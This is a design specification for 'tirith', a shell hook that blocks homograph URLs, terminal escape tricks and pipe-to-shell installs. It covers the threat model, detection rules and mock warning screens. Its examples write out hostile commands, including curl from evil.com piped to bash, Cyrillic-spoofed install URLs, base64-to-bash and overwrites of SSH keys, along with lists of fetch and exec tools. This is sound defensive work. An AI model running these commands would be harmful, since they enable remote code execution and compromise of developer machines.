# tirith

> Browsers solved homograph attacks years ago. Terminals haven't. tirith is the browser-equivalent safety net for the terminal.

## The Problem

```
1. Attacker puts this in a README:
   curl -sSL https://іnstall.example-clі.dev | bash
                       ^                  ^
                  Cyrillic і          Cyrillic і
                 (U+0456)            (U+0456)

2. Developer copies it, pastes into terminal, hits enter

3. curl resolves the spoofed domain, downloads malicious script

4. bash executes it immediately

5. Developer is compromised
```

No existing tool guards the moment between "copy URL" and "execute command."

- **Semgrep** scans your source code for vulnerabilities — doesn't operate on URLs you consume.
- **Snyk** scans dependencies for known CVEs — doesn't care how you installed them or if the install URL was spoofed.
- **Socket.dev** watches package managers (npm, pip) — doesn't intercept `curl`, `wget`, `git clone`, or any arbitrary command.
- **dnstwist** generates domain permutations — tells the domain owner about fakes, not the developer consuming them.

tirith protects **the developer**, at the moment they paste and hit enter, with zero friction.

---

## Product Line

### 1. `tirith` (OSS, free)

The shell hook. Zero friction, zero new commands. Distribution play for adoption.

### 2. `tirith feed` (paid, $7/mo individual, $15/seat/mo team)

Live threat intelligence feed consumed by the free tool. Team tier includes policy engine, audit export, and admin dashboard.

### 3. `tirith ci` (paid, $50-500/mo based on org size)

GitHub App + CI scanner. Positioned as "URL execution surface scanner" — finds links and commands that cause code execution in docs, scripts, and workflows.

### 4. `tirith monitor` (paid, $30/mo per domain)

Continuous domain monitoring for project maintainers. Actionable alerts with abuse report templates.

---

## Architecture

### Core engine: Rust binary, shell is just glue

Pure shell is a land of edge cases and performance cliffs. The core engine is a small static Rust binary. Shell hooks are thin wrappers that call it.

```
Shell hook (zsh/bash/fish/powershell)
       |
       v
tirith binary (Rust, statically linked)
       |
       ├── Returns exit code:
       │   0 = allow (silent)
       │   1 = block (print reason to stderr)
       │   2 = warn (print prompt payload to stderr, wait for user input on /dev/tty)
       |
       └── Structured JSON output available via --json flag
```

Benefits:
- Single detection engine shared across zsh, bash, fish, PowerShell — no logic rewrite per shell
- Deterministic URL parsing (public suffix list, strict host extraction, safe percent-decoding)
- Fast startup (static binary, no runtime)
- Proper Unicode handling via Rust's unicode libraries
- Testable in isolation without shell environment

### Fast-path architecture (how caching actually works)

The Rust binary is invoked per-command, so it has no persistent memory between invocations. The fast path is split between shell and binary:

**Shell layer (< 1ms):**
1. Shell hook checks if command matches URL-like regex (`https?://`, `git@`, `ssh://`, etc.)
2. If no match AND no control characters detected, bail immediately — binary is never invoked
3. Shell hook loads allowlist into a hash map at shell init time (`typeset -A` in zsh, `declare -A` in bash)
4. If all extracted hostnames are in the allowlist hash, bail — binary is never invoked

**Binary layer (when invoked, < 5ms typical):**
1. Binary loads compiled data files from `~/.tirith/data/` (confusables, PSL, popular repos) — mmap'd, no parsing overhead
2. Binary loads feed.json if present
3. Runs full analysis pipeline
4. Returns exit code + output

**Future option:** Long-lived `tirithd` daemon that holds all data in memory and answers over a Unix socket. This eliminates per-invocation data loading overhead entirely. Not needed for MVP — the shell-layer fast path handles the common case.

### Directory structure

```
~/.tirith/
  ├── tirith.sh            # zsh/bash hook (thin wrapper, sources shell-specific glue)
  ├── tirith.fish          # fish hook
  ├── tirith.ps1           # PowerShell hook
  ├── bin/
  │   └── tirith           # Rust binary (the actual engine)
  ├── lib/
  │   ├── zsh-hook.zsh       # zsh preexec + bracketed-paste widget
  │   ├── bash-hook.bash     # bash preexec + readline binding
  │   └── fish-hook.fish     # fish event handler
  ├── data/
  │   ├── confusables.bin    # Unicode confusable character mappings (compiled)
  │   ├── public-suffix.bin  # Public suffix list (compiled)
  │   └── popular-repos.bin  # Known popular repos for typosquat detection
  ├── allowlist              # Trusted domains (one per line, supports wildcards)
  ├── blocklist              # Blocked domains (one per line)
  ├── feed.json              # Signed threat feed (synced daily, paid)
  ├── policy.yml             # Team policy file (optional)
  ├── receipts/              # Install receipts from safe mode runs
  └── log                    # Audit log of all blocked/warned URLs
```

### Installation

```bash
# One line in .zshrc / .bashrc
source ~/.tirith/tirith.sh
```

### Performance contract

- Commands without URLs or control chars: < 1ms overhead (shell-layer fast bail, binary not invoked)
- Commands with allowlisted URLs only: < 1ms overhead (shell-layer allowlist hash check, binary not invoked)
- Commands with non-allowlisted URLs: < 5ms overhead (binary invoked, full analysis)
- Commands with suspicious URLs: blocks and shows UI (intentional)
- Redirect resolution (paranoia high): cached on disk for 5 minutes per URL

---

## Threat Model

### 1. Terminal escape and control character attacks

These are first-class threats. Terminals are not browsers — they render control characters that can visually deceive.

| Attack | Mechanism | Risk |
|--------|-----------|------|
| ANSI escape injection | `\x1b[` sequences rewrite displayed text, move cursor, hide content | Pasted text visually shows `git status` but actually contains `curl evil.com \| bash` behind escape sequences that rewrite the display |
| Carriage return trick | `\r` in pasted content can cause **immediate submission** of the line up to that point in some terminals/line editors (a paste-jacking auto-enter variant), or overwrite the visible beginning of the line | Partial command execution mid-paste, or visual mismatch between what's displayed and what's buffered |
| Backspace trick | `\b` moves cursor back, visually overwriting characters | `curl evil.com\b\b\b\b\b\b\b\b\bgood.com` — terminal may display `good.com` but the full byte sequence is in the line buffer |
| Unicode bidi override | RTL/LTR override characters (U+202E, U+202D, U+2066-U+2069) | `evil.sh` rendered as `hs.live` when bidi controls flip display order |
| Zero-width characters | ZWJ (U+200D), ZWNJ (U+200C), zero-width space (U+200B) in domains/paths | `github.com` with invisible characters resolves to a different domain |

**Policy:** Any control character other than `\n` and `\t` is BLOCK by default in pasted content. Any ANSI escape sequence is BLOCK by default. There is no legitimate reason for pasted terminal commands to contain escape sequences or carriage returns.

### 2. Source-sink execution model

Instead of pattern-matching specific command strings, tirith models commands as a graph of **sources** (download primitives) and **sinks** (execution primitives).

**Sources** — anything that fetches remote content:

```
curl, wget, fetch, aria2c, httpie (http/https)
git clone, git pull, git submodule update
docker pull, docker build (FROM)
scp, rsync
nc, ncat, socat
python -c "import urllib...", node -e "fetch(...)"
```

**Sinks** — anything that executes content:

```
sh, bash, zsh, fish, dash, ksh
python, python3, node, perl, ruby, php
eval, exec, source, . (dot)
sudo sh, sudo bash, sudo -s
xargs sh -c
env VAR=... (when VAR is later executed)
```

**PowerShell sources and sinks:**

```
Sources: Invoke-WebRequest (iwr), Invoke-RestMethod (irm), wget (alias), curl (alias)
Sinks:   Invoke-Expression (iex), & (call operator), Start-Process, powershell -Command
Patterns: iwr https://... | iex, irm https://... | iex, & ([scriptblock]::Create((irm ...)))
```

**Pipe/connection patterns** between source and sink:

```
source | sink                          # direct pipe
source > file && sink file             # download-then-exec
source -o file && chmod +x file && ./file
sink <(source)                         # process substitution
sink <<< "$(source)"                   # here-string
sink -c "$(source)"                    # command substitution
eval "$(source)"                       # eval substitution
. <(source)                            # dot-source
ssh host 'source | sink'              # remote pipe
scp host:file /tmp/x && /tmp/x        # remote fetch + exec
```

**Archive install chains:**

```
curl ... | tar xz && ./install.sh      # download archive, extract, execute
curl ... -o x.tgz && tar -xzf x.tgz && ./install.sh
wget ... -O - | unzip - && ./setup.sh
```

Any detected source-to-sink connection triggers a warning, regardless of exact syntax.

### 3. URL-like pattern detection (beyond `https?://`)

tirith triggers on all of these, not just HTTP URLs:

| Pattern | Example |
|---------|---------|
| `http://`, `https://` | Standard URLs |
| `git@host:org/repo.git` | SCP-style git syntax |
| `ssh://`, `git://`, `svn://` | Non-HTTP VCS protocols |
| `rsync://` | rsync protocol |
| `ftp://`, `ftps://` | FTP |
| `npm install git+https://...` | npm git dependency |
| `pip install -e git+...` | pip editable git install |
| `docker pull registry/repo` | Docker registry references (no scheme) |
| Schemeless URLs | `curl example.com/install.sh` — ambiguous, typically resolves to HTTP (not HTTPS) in most tools. WARN or BLOCK when sink present. |

### 4. Normalization and deobfuscation layer

Before running heuristics, tirith normalizes input to defeat obfuscation:

| Technique | What it catches |
|-----------|----------------|
| Percent-decoding (iterative, capped at 3 rounds) | `%2568ttp` -> `%68ttp` -> `http`. Stops at cap to prevent DoS. |
| ANSI-C quote expansion | `$'\x63\x75\x72\x6c'` -> `curl` |
| Shell quote removal and retokenization | `curl "$URL"`, `curl "${url}"`, `curl ''https://...'` -> extracted URL |
| Backtick and `$()` expansion (static, best-effort) | `` url=`echo https://evil.com`; curl $url `` -> flagged |
| String concatenation detection | `a="https://evil"; b=".com"; curl "${a}${b}"` -> flagged as suspicious pattern |
| Base64 detection | `echo "aHR0cHM6Ly9ldmlsLmNvbQ==" \| base64 -d \| bash` -> flagged |

This is best-effort, not a full shell parser. The goal is to raise the bar enough that attackers can't dodge detection with trivial encoding.

**Caps and limits (DoS prevention):**
- Max paste length: 64 KB (configurable). Longer pastes are truncated for analysis, full content is blocked with a warning.
- Max URLs extracted per command: 50. Beyond this, warn about unusual command complexity.
- Max normalization rounds: 3 (percent-decoding loops).
- Max binary analysis time: 50ms hard timeout. If exceeded, allow with a log entry (fail-open to avoid blocking the developer).

### 5. Redirect awareness (optional network check)

When `curl -L` or `wget` (follows redirects by default) is detected:

```
Paranoia low:    no network calls, skip
Paranoia medium: no network calls, skip
Paranoia high:   GET with Range: bytes=0-0 to resolve redirect chain
                 (HEAD is unreliable — some servers behave differently for HEAD vs GET)
                 Hard cap: max 10 redirects, 5 second total timeout
                 Results cached on disk for 5 minutes per URL

Display:
  Original:   https://legit.com/install.sh
  Redirects:  -> https://cdn.legit.com/install.sh (same org, ok)
              -> https://evil-cdn.com/payload.sh   (CROSS-DOMAIN!)

  Cross-domain redirect detected after 2 hops.
  Final host: evil-cdn.com (not associated with legit.com)

  [r]un  [a]bort
```

- Conditional on TTY (never in non-interactive mode)
- Off by default, enabled at paranoia `high` or via policy

---

## Core Features (OSS — Phase 1)

### 1. Preexec hook

Silent guard on every command. Intercepts before execution.

```
User types command
       |
       v
  Shell fast path:
    - No URL-like pattern AND no control chars? -> run immediately (< 1ms)
    - All hostnames in allowlist hash? -> run immediately (< 1ms)
       |
       v
  Invoke tirith binary with raw command string
       |
       v
  Binary: normalize -> extract URLs -> check each -> analyze command shape
       |
       v
  Exit 0 (allow)  -> run silently, zero output
  Exit 1 (block)  -> print reason to stderr, abort command
  Exit 2 (warn)   -> print prompt to stderr, wait for user choice on /dev/tty
```

**Non-interactive behavior:**

If not a TTY (scripts, CI, piped input), never prompt. Default to policy action:
- BLOCK triggers -> block silently, log, exit non-zero
- WARN triggers -> log only (or block, if policy says so)

This prevents tirith from breaking automated workflows.

### 2. Clipboard guard (bracketed paste interception)

Intercepts at **paste time**, before the command even lands on the prompt.

Modern terminals wrap pasted text with escape sequences (`\e[200~` ... `\e[201~`). tirith hooks into the shell's paste handling to inspect content before it reaches the command line.

**Clean paste (99% of the time):**

Text appears on the command line normally. No delay. No output. User sees nothing.

**Suspicious paste — control characters / escape sequences:**

```
  +-- BLOCKED: TERMINAL ESCAPE SEQUENCES ---------------------------+
  | Pasted content contains ANSI escape sequences that can          |
  | manipulate your terminal display.                               |
  |                                                                 |
  | Raw bytes detected:                                             |
  |   \x1b[2K   (erase line)                                       |
  |   \x1b[1A   (cursor up)                                        |
  |   \x0d      (carriage return — can trigger mid-paste execution) |
  |                                                                 |
  | Visible text:   git clone https://github.com/legit/repo        |
  | Actual payload: curl https://evil.com/x.sh | bash              |
  |                                                                 |
  | [c]ancel  [s]how full hex dump                                  |
  +------ this content was NOT placed on your command line ---------+
  $ _
```

**Suspicious paste — homograph URL:**

```
  +-- CLIPBOARD WARNING --------------------------------------------+
  | Non-ASCII characters detected in pasted URL hostname.           |
  |                                                                 |
  | Pasted:  curl -sSL https://іnstall.example-clі.dev | bash      |
  | Actual:  curl -sSL https://xn--nstall-cuf.example-xn--cl-8cd.dev |
  |                                                                 |
  | Safe rewrite:                                                   |
  |   tirith run https://get.example-tool.sh                      |
  |                                                                 |
  | [p]aste anyway  [c]ancel  [s]how bytes                          |
  +------ this content was NOT placed on your command line ----------+
  $ _
```

**Hidden multi-line command paste:**

```
  +-- HIDDEN COMMANDS DETECTED -------------------------------------+
  | Your clipboard contains 3 lines but only 1 was visible         |
  | on the webpage.                                                 |
  |                                                                 |
  | Line 1: git clone https://github.com/legit/repo                |
  | Line 2: curl https://evil.com/x.sh | bash            <- HIDDEN |
  | Line 3: clear                                         <- HIDDEN |
  |                                                                 |
  | The hidden lines would execute silently.                        |
  |                                                                 |
  | [1] paste line 1 only  [a]ll  [c]ancel                         |
  +------ this content was NOT placed on your command line ----------+
  $ _
```

The command **never hits the prompt** until the user makes a choice. The cursor sits at an empty prompt.

**Implementation notes:**

The exact paste interception mechanism varies by shell:
- **zsh:** Override the `bracketed-paste` widget. The widget receives the raw pasted bytes, pipes them to the tirith binary for analysis, and only inserts into the line buffer if clean.
- **bash:** Use `bind` to intercept the bracketed paste escape sequences via readline.
- **fish:** Hook into `fish_clipboard_paste` event.
- **PowerShell:** `Set-PSReadLineKeyHandler` for paste events.

Details are implementation-specific and will be finalized during development. The spec describes behavior, not exact zsh widget API usage.

### 3. URL detection checks

Applied to every URL found in a command or paste:

**Hostname checks:**

| Check | Severity | Description |
|-------|----------|-------------|
| Non-ASCII in hostname | BLOCK | Any byte outside printable ASCII range (0x20-0x7E) in URL hostname. Catches all homograph attacks regardless of script. |
| Punycode domain | BLOCK | Domain containing `xn--` prefix. Internationalized domain encoded for DNS. |
| Mixed-script within label | BLOCK | Latin + Cyrillic (or other non-common script) characters within the same DNS label (excluding hyphens and digits). Almost always malicious. Mixed script across labels can occur in legitimate IDNs and is handled by the IDN allowlist. |
| Userinfo trick | BLOCK | URL contains `@` in authority position (detected via RFC 3986 compliant host extraction, not naive string search): `https://github.com@evil.com/payload`. Real host is `evil.com`. |
| Confusable domain | WARN | Domain visually similar to a known domain (Levenshtein distance, Unicode confusables table). |
| Raw IP address | WARN | `http://185.234.xx.xx/install.sh`. No legitimate installer uses a raw IP. |
| Non-standard port | WARN | Known domain with unexpected port: `https://github.com:8443/...`. |
| Trailing dot / whitespace | WARN | `github.com.` or `github.com\t` — resolves differently than expected. |
| Lookalike TLD | WARN | `.zip`, `.mov` and other new TLDs that resemble file extensions (social engineering vector). |

**Path/query checks (separate from hostname, different defaults):**

| Check | Severity | Description |
|-------|----------|-------------|
| Non-ASCII in path | WARN | Confusable characters in URL path: `github.com/lеgit/repo` (Cyrillic е in path). Not BLOCK because non-ASCII paths can be legitimate. |
| Homoglyph in path | WARN | Visually confusable characters in path components near known repo/package names. |
| Double encoding | WARN | Nested percent-encoding after normalization: `%2568ttp` -> `%68ttp` -> `http`. |

**Protocol/transport checks:**

| Check | Severity | Description |
|-------|----------|-------------|
| Plain HTTP to sink | BLOCK | `http://` URL connected to an execution sink. No TLS = MITM trivial. Allowlist overrides. |
| Schemeless URL to sink | WARN | Schemeless URLs are ambiguous and commonly resolve to HTTP. BLOCK if policy is strict. |
| Shortened URL | WARN | `bit.ly`, `t.co`, `tinyurl.com`, etc. Resolve and show final destination (at paranoia medium+). |
| Insecure TLS flags | BLOCK (with sink), WARN (without) | `curl -k`, `curl --insecure`, `wget --no-check-certificate`. Disabling TLS verification when piping to a shell is extremely dangerous. |
| raw.githubusercontent.com | WARN (elevated if sink present) | Legitimate domain but frequently abused. Allowed normally, elevated to WARN if connected to an execution sink. |

**Environment checks:**

| Check | Severity | Description |
|-------|----------|-------------|
| Proxy environment variables | WARN (elevated) | `http_proxy`, `https_proxy`, `all_proxy`, `curl --proxy` present. Can silently reroute "legit" domains through an attacker-controlled proxy. Elevates all URL warnings when detected. |

### 4. Command shape detection (source-sink model)

Beyond URL analysis, detect dangerous command patterns using the source-sink model:

| Pattern | Severity | Examples |
|---------|----------|---------|
| Direct pipe to shell | WARN | `curl ... \| bash`, `wget ... \| sh`, `curl ... \| python` |
| Process substitution | WARN | `bash <(curl ...)`, `source <(curl ...)`, `. <(curl ...)` |
| Command substitution to eval | WARN | `eval $(curl ...)`, `eval "$(wget ...)"` |
| Command substitution to shell | WARN | `sh -c "$(curl ...)"`, `bash -c "$(wget ...)"` |
| Here-string from download | WARN | `bash <<< "$(curl ...)"` |
| Download + chmod + exec chain | WARN | `curl -o x ... && chmod +x x && ./x` |
| Archive extract + exec chain | WARN | `curl ... \| tar xz && ./install.sh`, `curl -o x.tgz ... && tar -xzf x.tgz && ./setup.sh` |
| Download to PATH directory | WARN | `curl ... -o /usr/local/bin/thing` |
| Dotfile overwrite (write) | BLOCK | `wget -O ~/.bashrc ...`, `curl -o ~/.zshrc ...`, `curl ... > ~/.ssh/authorized_keys` |
| Dotfile append | BLOCK | `curl ... >> ~/.ssh/config`, `wget ... >> ~/.profile`, `cat ... >> ~/.gitconfig` |
| Heredoc to sensitive file | BLOCK | `cat << EOF > ~/.ssh/config` with content from a download source |
| Silent download + pipe | WARN (elevated) | `curl -s ... \| bash` — suppressed output + shell pipe |
| Sudo + any sink | WARN (elevated) | `sudo sh -c "$(curl ...)"` — elevated privileges |
| Remote pipe via SSH | WARN | `ssh host 'curl ... \| sh'` — source-sink on remote host |
| Remote fetch + exec | WARN | `scp host:/tmp/x.sh . && bash x.sh` |
| Env var staging | WARN | `export URL=$(curl ...)` followed by execution in same paste |
| PowerShell download + exec | WARN | `iwr https://... \| iex`, `irm https://... \| iex`, `& ([scriptblock]::Create((irm ...)))` |

### 5. Pipe-to-shell safe mode (script pre-analyzer)

When a source-to-sink connection is detected (even with a clean URL), offer to download-first-then-review:

```
  +-- PIPE-TO-SHELL INTERCEPTED ------------------------------------+
  |                                                                 |
  |  Source: https://get.example-tool.sh (TLS ok, cert age: 2yr)        |
  |  Size:   4.2 KB (138 lines)                                    |
  |  SHA256: a1b2c3d4e5...                                          |
  |                                                                 |
  |  Static analysis (best-effort, inferred from script content):   |
  |  |- Downloads binary from: cdn.example-tool.sh                  |
  |  |- Writes to: ~/.example-tool/bin/ (inferred)                  |
  |  |- Modifies: ~/.bashrc (inferred, adds to PATH)               |
  |  |- Network calls: 2 domains referenced                         |
  |  |- Privilege: no sudo                                          |
  |  |- Obfuscation: none detected                                  |
  |  |- eval/base64/hex: none                                       |
  |                                                                 |
  |  Risk: URL trust 94/100 | Command risk HIGH (pipe-to-shell)    |
  |                                                                 |
  |  [r]un  [v]iew script  [a]bort                                  |
  |                                                                 |
  |  Safe alternative:                                              |
  |    tirith run https://get.example-tool.sh                     |
  +---------------------------------------------------------------- +
```

Static analysis extracts from the script text:
- Referenced filesystem paths (where it likely writes)
- Referenced domains and IPs (where it likely connects)
- Whether it modifies shell config files
- Whether it contains obfuscated code (`eval`, base64 decode, hex decode)
- Whether it uses `sudo` or references system paths
- Privilege level required

**Important:** These fields are **best-effort inferences from script text**, not runtime observations. The script may do things not detectable by static analysis. For verified runtime behavior, use `tirith run` with tracing enabled (future: `--trace` flag using platform-specific syscall tracing).

### 6. `tirith run` — safe installer runner

One-command replacement for `curl ... | bash` that becomes muscle memory:

```bash
$ tirith run https://get.example-tool.sh
```

This command:
1. Downloads to a temp file (never pipes directly to shell)
2. Prints SHA256 hash
3. Runs static analysis (same as pipe-to-shell interceptor)
4. Opens in `$PAGER` for review
5. Runs only after explicit `y` confirmation
6. Stores an install receipt (see below)
7. Caches the downloaded script — second run is instant if hash matches

```
  Downloading https://get.example-tool.sh ...
  SHA256: a1b2c3d4e5f6...
  Size:   4.2 KB (138 lines)

  Static analysis (inferred from script content):
  |- Downloads binary from: cdn.example-tool.sh
  |- Writes to: ~/.example-tool/bin/
  |- Modifies: ~/.bashrc (adds to PATH)
  |- Network calls: 2 domains referenced

  Press [v] to view script, [y] to run, [n] to abort: _
```

### 7. Install receipts (signature feature)

When tirith runs an installer in safe mode (`tirith run`), it stores a receipt:

```json
{
  "url": "https://get.example-tool.sh",
  "final_url": "https://get.example-tool.sh",
  "redirects": 0,
  "sha256": "a1b2c3d4e5f6...",
  "size_bytes": 4301,
  "domains_referenced": ["cdn.example-tool.sh"],
  "paths_referenced": ["~/.example-tool/bin/example-tool", "~/.bashrc"],
  "analysis_method": "static",
  "privilege": "user",
  "timestamp": "2026-02-01T14:32:01Z",
  "cwd": "/Users/dev/project",
  "git_repo": "github.com/dev/project",
  "git_branch": "main"
}
```

Note: `domains_referenced` and `paths_referenced` are statically inferred from the script text. The `analysis_method` field indicates whether these are from static analysis (`"static"`) or runtime tracing (`"traced"` — future).

Commands:

```bash
$ tirith receipt last
  Last install: https://get.example-tool.sh
  SHA256: a1b2c3d4e5f6...
  Domains referenced: cdn.example-tool.sh
  Paths referenced: ~/.example-tool/bin/example-tool, ~/.bashrc
  Analysis: static (inferred from script content)
  Run at: 2026-02-01 14:32 UTC in /Users/dev/project (main)

$ tirith receipt list
  2026-02-01  https://get.example-tool.sh          a1b2c3...  static
  2026-01-28  https://sh.rustup.rs            f7e8d9...  static
  2026-01-15  https://get.docker.com           b3c4d5...  static

$ tirith receipt verify a1b2c3d4e5f6
  Fetching https://get.example-tool.sh ...
  Current SHA256: a1b2c3d4e5f6...
  Receipt SHA256: a1b2c3d4e5f6...
  MATCH — script has not changed since last run.

$ tirith receipt verify a1b2c3d4e5f6
  Current SHA256: x9y8z7w6...
  Receipt SHA256: a1b2c3d4e5f6...
  MISMATCH — script has changed since you last ran it!
  Use `tirith run` to review the new version.
```

This is "nutrition labels for install scripts." It creates a data flywheel for the feed without spying on people — users can opt-in to share anonymized receipt hashes (URL + SHA256 only, no paths or commands) to help detect compromised install scripts.

### 8. `tirith why` — explain mode

When a warning triggers and the user wants to understand:

```bash
$ tirith why

  Last trigger: BLOCK — Non-ASCII characters in URL hostname
  Rule: non_ascii_hostname
  Triggered at: 2026-02-01 14:32:01 UTC

  What happened:
    Your command contained a URL with Cyrillic character і (U+0456)
    at position 27 in the hostname. This is a homograph attack —
    the URL visually mimics install.example-cli.dev but resolves to
    a completely different server.

  Proof:
    Byte 12: expected 0x69 (Latin i), got 0xd1 0x96 (Cyrillic і)

  Safe rewrite:
    curl -sSL https://install.example-cli.dev | bash
    or better:
    tirith run https://install.example-cli.dev
```

Every warning comes with:
1. Which rule triggered and the minimal proof
2. A "safe rewrite" suggestion when possible (strip userinfo, resolve punycode, replace pipe-to-shell with `tirith run`, resolve shortened URL)

Developers forgive warnings when they come with a clean fix.

### 9. `tirith score` — URL trust score

```bash
$ tirith score https://get.example-tool.sh

  URL trust:     98/100
    [ok] All ASCII hostname
    [ok] No confusable characters
    [ok] Domain age: 4 years
    [ok] TLS cert: valid, issued by Cloudflare
    [ok] IP: Cloudflare CDN (known provider)
    [ok] On tirith known-safe list

  Command risk:  HIGH (if piped to shell)
    [!!] Serves executable script content

  Content risk:  LOW (based on last receipt)
    [ok] No obfuscation detected in script
    [ok] No encoded payloads
    [ok] All referenced domains match source
```

Three separate dimensions (not combined into a single misleading number):
- **URL trust** — domain and encoding characteristics (local checks + optional network checks at paranoia high)
- **Command risk** — execution sinks present in the command context
- **Content risk** — script analysis results (only available if previously run via `tirith run`)

A clean domain can still produce a "HIGH command risk" if piped to shell. These dimensions are independent.

### 10. `tirith diff` — terminal diff view

```bash
$ tirith diff https://іnstall.example-clі.dev

  Expected:  i n s t a l l . e x a m p l e - c l i . d e v
  Got:       і n s t a l l . e x a m p l e - c l і . d e v
             ^                                   ^
        U+0456 CYRILLIC                    U+0456 CYRILLIC
        SMALL LETTER                       SMALL LETTER
        BYELORUSSIAN-                      BYELORUSSIAN-
        UKRAINIAN I                        UKRAINIAN I

  Byte comparison:
  Position 0: expected 0x69 (Latin i) | got 0xd1 0x96 (Cyrillic і, 2 bytes)
  Position 18: expected 0x69 (Latin i) | got 0xd1 0x96 (Cyrillic і, 2 bytes)

  Closest ASCII mapping:
  іnstall.example-clі -> install.example-cli
  ^                  ^    ^                  ^
  Cyrillic           |    Latin              Latin
                Cyrillic
```

Default display for any homograph/confusable warning. Shows:
- Monospace spaced character rendering
- Unicode codepoints
- Closest ASCII mapping
- Highlighted confusable positions

### 11. Local allowlist / blocklist

```
# ~/.tirith/allowlist — one domain per line, supports wildcards
get.example-tool.sh
sh.rustup.rs
raw.githubusercontent.com
*.docker.com

# ~/.tirith/blocklist — manually blocked domains
evil-domain.xyz
```

Allowlisted domains are checked in the shell-layer fast path (hash map lookup, binary not invoked). Blocklisted domains are always blocked regardless of content.

**False positive handling for legitimate IDNs:** Default is to block all punycode/non-ASCII hostnames. For orgs that use legitimate IDN domains, the policy file can allowlist specific IDN domains:

```yaml
# policy.yml
allowed_idn_domains:
  - "münchen.de"
  - "例え.jp"
```

### 12. Audit log

Every blocked, warned, and allowed URL is logged:

```
# ~/.tirith/log (structured, one JSON object per line)
{"ts":"2026-02-01T14:32:01Z","action":"block","reason":"non_ascii_hostname","cmd":"curl -sSL https://xn--nstall-cuf.example-xn--cl-8cd.dev | bash","cwd":"/Users/dev/project","git":"main","url":"https://xn--nstall-cuf.example-xn--cl-8cd.dev"}
{"ts":"2026-02-01T14:35:12Z","action":"warn","reason":"source_sink_pipe","cmd":"curl -fsSL https://get.docker.com | sh","cwd":"/Users/dev/infra","git":"deploy","url":"https://get.docker.com"}
{"ts":"2026-02-01T14:35:15Z","action":"allow","reason":"user_override","cmd":"curl -fsSL https://get.docker.com | sh","cwd":"/Users/dev/infra","git":"deploy","url":"https://get.docker.com"}
```

Structured JSON for easy parsing, SIEM ingestion, and analysis.

---

## Ecosystem-Specific Guards

### Git clone typosquat detection

```bash
$ git clone https://github.com/loadash/lodash

  WARN: Organization "loadash" looks similar to "lodash" (lodash/lodash).
  Did you mean: https://github.com/lodash/lodash ?

  [c]ontinue  [s]witch  [a]bort
```

Also covers SCP-style git URLs:

```bash
$ git clone git@github.com:loadash/lodash.git

  WARN: Organization "loadash" looks similar to "lodash".
```

### Docker pull from non-standard registries

```bash
$ docker pull evil-registry.io/nginx

  WARN: Pulling "nginx" from non-standard registry "evil-registry.io".
  Official image: docker.io/library/nginx

  [c]ontinue  [a]bort
```

### pip / npm install from URL

```bash
$ pip install https://evil.com/requests-2.28.tar.gz

  WARN: Installing Python package from raw URL, not from PyPI.
  Known PyPI package with same name: requests (https://pypi.org/project/requests/)

  [c]ontinue  [a]bort
```

Also covers:

```bash
$ pip install -e git+https://gіthub.com/psf/requests.git#egg=requests
  BLOCKED: Non-ASCII in hostname for pip git dependency.

$ npm install git+https://gіthub.com/lodash/lodash.git
  BLOCKED: Non-ASCII in hostname for npm git dependency.
```

### Web3: RPC endpoint validation

```bash
$ cast send --rpc-url https://maіnnet.infura.io/v3/...

  BLOCKED: Non-ASCII in RPC endpoint hostname.
  Sending transactions through a spoofed RPC exposes raw signed
  transactions to the attacker (front-running, replay, redirection).
```

### Web3: Contract address / ENS confusable detection

```bash
$ cast send 0xd8dA6BF26964aF9D7eEd9e03E534l5D37aA96045 ...

  WARN: Address contains visually confusable characters.
  Position 35: 'l' (lowercase L) looks like '1' (digit one).
```

---

## UX Design Principles

### Zero friction on clean input

99%+ of commands pass through with zero output and < 1ms overhead. The user should forget tirith is running.

### Non-interactive mode

If not a TTY (scripts, CI, piped input, cron):
- Never prompt. Never wait for input.
- BLOCK actions -> exit non-zero, log.
- WARN actions -> log only (or block, per policy).
- Output goes to stderr, never pollutes stdout.

### Bypass escape hatch

```bash
TIRITH=0 curl -L https://something.xyz | bash
```

This is a standard shell per-command prefix — the variable only exists for that single command and does not persist in your session. For local dev use when you know what you're doing.

**Org policy can disable this:**

```yaml
# policy.yml
allow_bypass_env: false    # TIRITH=0 is ignored, org rules enforced
```

### Every warning comes with a fix

No naked warnings. Every trigger includes:
- What rule fired and why
- The minimal proof (byte diff, domain comparison, etc.)
- A safe rewrite or alternative command

```
  WARN: Pipe-to-shell detected.
  Safe alternative: tirith run https://get.example-tool.sh
```

### Consistent prompt UI

All interactive prompts follow the same pattern:

```
  +-- [BLOCK/WARN]: [Short reason] --------------------------------+
  |                                                                 |
  |  [Details]                                                      |
  |                                                                 |
  |  [Options with single-key shortcuts]                            |
  +------ [footer: what happened to the command] -------------------+
```

---

## Paid: tirith feed

### What it provides

The free tool catches structural anomalies (non-ASCII bytes, punycode, suspicious patterns). The feed catches **structurally clean but known-malicious domains** — this is exactly where heuristics lose and intel wins.

| Data | Source | Update frequency |
|------|--------|-----------------|
| Active homograph domains targeting developer tools | Certificate transparency logs + dnstwist permutations for top 500 dev tool domains | Daily |
| Known malicious install script URLs | Honeypots + community reports + manual research | Real-time |
| Newly registered domains mimicking dev tools | Domain registration monitoring | Daily |
| Compromised legitimate URLs | Threat intel partnerships + VirusTotal | Real-time |
| Malicious curl-pipe-bash script signatures (SHA256) | Static analysis of install scripts found in the wild | Weekly |

### How it works

```
~/.tirith/feed.json         <- synced daily (or hourly for teams)

tirith checks feed FIRST    <- known-bad = instant block
then falls through to local   <- heuristic detection
pattern detection

Feed is a signed JSON file    <- ed25519 signature, prevents tampering
pulled from api.tirith.dev
```

### Feed transparency

- Append-only transparency log of all feed entries — customers can verify entries are not quietly added or removed
- Each indicator includes a reason code: `ct_observed`, `user_report`, `sandbox_detonation`, `registration_monitor`, `honeypot`
- Consider Sigstore-style signatures for known installer scripts where publishers opt in

### Pricing

| Tier | Price | Includes |
|------|-------|---------|
| Individual | $7/mo | Daily feed sync, personal use |
| Team | $15/seat/mo | Hourly feed sync, team audit dashboard, central policy distribution, cannot-override block rules, SIEM export (webhook, syslog), admin view of top triggers, audit log aggregation |

---

## Paid: tirith ci

### Positioning

"URL execution surface scanner" — finds links and commands that cause code execution in docs, scripts, and workflows. Not generic security scanning.

### What it scans

| File type | What it finds |
|-----------|--------------|
| `README.md`, `CONTRIBUTING.md`, docs | Homograph URLs, spoofed install commands |
| `Makefile`, `Justfile` | `curl \| bash` in build targets pointing to suspicious URLs |
| `Dockerfile`, `docker-compose.yml` | Spoofed base image registries, suspicious ADD/COPY from URL |
| `install.sh`, `setup.sh`, `bootstrap.sh` | Hardcoded malicious URLs, obfuscated download commands |
| `.github/workflows/*.yml` | Actions pulling from spoofed URLs, curl in CI steps |
